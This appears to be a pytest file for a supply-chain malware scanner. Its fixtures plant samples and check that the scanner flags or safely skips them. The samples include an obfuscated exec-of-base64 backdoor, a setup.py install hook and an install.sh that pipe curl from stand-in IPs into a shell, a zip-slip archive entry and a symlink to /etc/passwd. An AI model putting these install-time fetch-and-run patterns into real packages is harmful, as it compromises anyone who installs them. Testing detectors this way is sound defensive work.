"""Recursive directory scanner: discovery, robustness against hostile/malformed input, and detection."""

from __future__ import annotations

import io
import json
import os
import tarfile
import zipfile
from pathlib import Path

import pytest

pytest.importorskip("ast_detection", reason="scanner local mode needs the AST sources")

import scanner  # noqa: E402

BACKDOOR = ('import os; exec(__import__("base64").b64decode('
            '"aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2VjaG8gc3VwcGx5X2NoYWluX2F0dGFja19kZXRlY3RlZCcp"))\n')
CLEAN = 'def add(a, b):\n    """Add two numbers."""\n    return a + b\n'
LAB = Path(os.environ.get("LAB_DIR", scanner.default_target()))


def _zip(entries: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    return buf.getvalue()


@pytest.fixture(scope="module")
def hostile_lab(tmp_path_factory: pytest.TempPathFactory) -> Path:
    root = tmp_path_factory.mktemp("lab")
    good = root / "good_pkg"
    (good / "src" / "good").mkdir(parents=True)
    (good / "src" / "good" / "__init__.py").write_text(CLEAN)
    (good / "setup.py").write_text("from setuptools import setup\nsetup(name='good')\n")
    (good / "README.md").write_text("# docs\n")
    (good / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n" + os.urandom(64))

    bad = root / "bad_pkg"
    (bad / "bad" / "deep" / "deeper").mkdir(parents=True)
    (bad / "bad" / "deep" / "deeper" / "util.py").write_text(CLEAN + BACKDOOR)          # deeply nested payload
    (bad / "setup.py").write_text(
        "import os\nfrom setuptools import setup\nfrom setuptools.command.install import install\n"
        "class P(install):\n    def run(self):\n        os.system('curl -s http://203.0.113.9/x | sh')\n"
        "        install.run(self)\nsetup(name='bad', cmdclass={'install': P})\n")
    (bad / "install.sh").write_text("#!/bin/sh\ncurl -fsSL http://198.51.100.4/p.sh | bash\n")
    (bad / "runme").write_text("#!/usr/bin/env python3\nimport os\nos.system('id')\n")  # extensionless, shebang

    broken = root / "broken_pkg"
    broken.mkdir()
    (broken / "syntax_error.py").write_text("def broken(:\n    pass\n")
    (broken / "latin1.py").write_bytes("s = '\xe9t\xe9'\n".encode("latin-1"))
    (broken / "nul_bytes.py").write_bytes(b"x = 1\x00\x00\x00\n")
    (broken / "empty.py").write_bytes(b"")
    (broken / "escape_link.py").symlink_to("/etc/passwd")
    secret = broken / "unreadable.py"
    secret.write_text(CLEAN)
    secret.chmod(0)

    (root / "archives").mkdir()
    (root / "archives" / "evil.zip").write_bytes(_zip({
        "pkg-1.0/pkg/__init__.py": BACKDOOR.encode(),
        "pkg-1.0/pkg/clean.py": CLEAN.encode(),
        "pkg-1.0/../../escape.py": b"print('zip-slip')\n",
        "pkg-1.0/inner.zip": _zip({"x.py": b"x = 1\n"}),
    }))
    tbuf = io.BytesIO()
    with tarfile.open(fileobj=tbuf, mode="w:gz") as tf:
        data = CLEAN.encode()
        info = tarfile.TarInfo("lib-2.0/lib/core.py")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    (root / "archives" / "lib-2.0.tar.gz").write_bytes(tbuf.getvalue())
    (root / "archives" / "corrupt.zip").write_bytes(b"PK\x03\x04 not really a zip")
    return root


@pytest.fixture(scope="module")
def report(hostile_lab: Path) -> dict:
    artifacts = Path(os.environ.get("ARTIFACT_DIR", scanner.PROJECT_ROOT / "artifacts"))
    if not (artifacts / "manifest.json").exists():
        pytest.skip("no trained artifacts for local mode")
    return scanner.run_scan(hostile_lab, scanner.LocalBackend(artifacts), quiet=True)


def _file(report: dict, path: str) -> dict:
    return next(f for f in report["files"] if f["path"] == path)


def test_classification() -> None:
    assert scanner.classify("a/setup.py") == "python"
    assert scanner.classify("requirements-dev.txt") == "manifest"
    assert scanner.classify("pyproject.toml") == "manifest"
    assert scanner.classify("x.pth") == "manifest"
    assert scanner.classify("Makefile") == "script" and scanner.classify("run.ps1") == "script"
    assert scanner.classify("dist/pkg-1.0.tar.gz") == "archive" and scanner.classify("w.whl") == "archive"
    assert scanner.classify("lib.so") == "binary"
    assert scanner.classify("tool", b"#!/usr/bin/env python3\n") == "python"
    assert scanner.classify("README.md") == "other"


def test_zip_slip_member_rejected() -> None:
    assert scanner._safe_member("pkg/../../etc/x") is None
    assert scanner._safe_member("/abs/path") is None
    assert scanner._safe_member("pkg/./a.py") == "pkg/a.py"


def test_recursive_discovery_finds_everything(report: dict) -> None:
    paths = {f["path"] for f in report["files"]}
    assert "bad_pkg/bad/deep/deeper/util.py" in paths
    assert "archives/evil.zip!/pkg-1.0/pkg/__init__.py" in paths
    assert "archives/lib-2.0.tar.gz!/lib-2.0/lib/core.py" in paths
    assert _file(report, "good_pkg/README.md")["verdict"] == "NOT_ANALYZED"


def test_payloads_detected_everywhere(report: dict) -> None:
    for path in ("bad_pkg/bad/deep/deeper/util.py", "bad_pkg/setup.py", "archives/evil.zip!/pkg-1.0/pkg/__init__.py"):
        assert _file(report, path)["verdict"] in ("MALICIOUS", "SUSPICIOUS"), path
    util = _file(report, "bad_pkg/bad/deep/deeper/util.py")
    assert util["verdict"] == "MALICIOUS"
    assert any("exec_of_decoded" in n["categories"] and n["line"] == 4 for n in util["ast_risk_factors"])
    assert _file(report, "bad_pkg/runme")["kind"] == "python"
    assert _file(report, "bad_pkg/install.sh")["status"] == "analyzed"


def test_clean_files_are_benign(report: dict) -> None:
    for path in ("good_pkg/src/good/__init__.py", "good_pkg/setup.py", "archives/lib-2.0.tar.gz!/lib-2.0/lib/core.py",
                 "archives/evil.zip!/pkg-1.0/pkg/clean.py"):
        assert _file(report, path)["verdict"] == "BENIGN", path
    groups = {g["group"]: g["project_verdict"] for g in report["groups"]}
    assert groups["good_pkg"] == "BENIGN" and groups["bad_pkg"] == "MALICIOUS"


def test_malformed_files_do_not_break_the_scan(report: dict) -> None:
    assert _file(report, "broken_pkg/syntax_error.py")["status"] == "analyzed"
    latin = _file(report, "broken_pkg/latin1.py")
    assert latin["status"] == "analyzed" and "latin-1" in latin["reason"]
    assert _file(report, "broken_pkg/nul_bytes.py")["status"] == "analyzed"
    assert _file(report, "broken_pkg/empty.py")["verdict"] == "BENIGN"
    link = _file(report, "broken_pkg/escape_link.py")
    assert link["verdict"] == "NOT_ANALYZED" and "not followed" in link["reason"]
    if os.geteuid() != 0:  # root can read mode-000 files
        assert _file(report, "broken_pkg/unreadable.py")["verdict"] == "ERROR"
    assert _file(report, "archives/corrupt.zip")["verdict"] == "ERROR"


def test_hostile_archive_members_reported_not_extracted(report: dict) -> None:
    slip = _file(report, "archives/evil.zip!/pkg-1.0/../../escape.py")
    assert slip["verdict"] == "NOT_ANALYZED" and "zip-slip" in slip["reason"]
    assert "nested archive" in _file(report, "archives/evil.zip!/pkg-1.0/inner.zip")["reason"]
    assert not (Path("/escape.py").exists() or (scanner.PROJECT_ROOT / "escape.py").exists())


def test_report_is_json_and_cli_renders(report: dict) -> None:
    json.dumps(report)
    text = scanner.render_cli(report, color=False)
    assert "OVERALL: MALICIOUS" in text and "bad_pkg/bad/deep/deeper/util.py" in text


def test_cli_exit_codes(hostile_lab: Path, tmp_path: Path) -> None:
    out = tmp_path / "r.json"
    assert scanner.main([str(hostile_lab), "--mode", "local", "-q", "-o", str(out), "--fail-on", "malicious"]) == 3
    assert json.loads(out.read_text())["summary"]["overall_verdict"] == "MALICIOUS"
    assert scanner.main([str(tmp_path / "missing"), "--mode", "local", "-q"]) == 2


@pytest.mark.skipif(not (LAB / "attack_simulation_repo").is_dir(), reason="supply_chain_lab not available")
def test_supply_chain_lab_ground_truth() -> None:
    """The lab's only injected payload (attack_simulation_repo models.py) is the only file flagged."""
    artifacts = Path(os.environ.get("ARTIFACT_DIR", scanner.PROJECT_ROOT / "artifacts"))
    if not (artifacts / "manifest.json").exists():
        pytest.skip("no trained artifacts")
    rep = scanner.run_scan(LAB, scanner.LocalBackend(artifacts), quiet=True)
    flagged = {f["path"]: f["verdict"] for f in rep["files"] if f["verdict"] in ("MALICIOUS", "SUSPICIOUS")}
    assert flagged == {"attack_simulation_repo/src/requests/models.py": "MALICIOUS"}
    assert not [f for f in rep["files"] if f["verdict"] == "ERROR"]
    groups = {g["group"]: g["project_verdict"] for g in rep["groups"]}
    assert groups["attack_simulation_repo"] == "MALICIOUS"
    assert all(v == "BENIGN" for k, v in groups.items() if k != "attack_simulation_repo")


@pytest.mark.skipif(not os.environ.get("AI_ENGINE_URL") or not (LAB / "attack_simulation_repo").is_dir(),
                    reason="needs the running ai_engine container and the mounted lab")
def test_service_mode_scan_matches_ground_truth() -> None:
    """Same scan through the ai_engine -> ast_detection containers (also streams to the dashboard)."""
    rep = scanner.run_scan(LAB, scanner.ServiceBackend(os.environ["AI_ENGINE_URL"]), quiet=True)
    flagged = {f["path"]: f["verdict"] for f in rep["files"] if f["verdict"] in ("MALICIOUS", "SUSPICIOUS")}
    assert flagged == {"attack_simulation_repo/src/requests/models.py": "MALICIOUS"}
    bad = next(f for f in rep["files"] if f["path"] in flagged)
    assert any("exec_of_decoded" in n["categories"] for n in bad["ast_risk_factors"])
